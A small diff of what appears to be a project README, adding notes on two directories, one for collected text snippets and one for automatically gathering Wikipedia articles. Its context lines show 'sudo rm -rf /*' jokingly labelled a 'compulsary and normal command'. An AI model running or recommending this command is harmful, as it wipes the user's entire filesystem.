@@ -22,3 +22,8 @@ node write
 
 # compulsary and normal command i am not responsible for the outcome of:
 sudo rm -rf /*
+```
+
+`./ultra` is just a place t collect a bunch of individual bits of text
+
+`./wkc` is an attempt at automatically collecting wikipedia articles
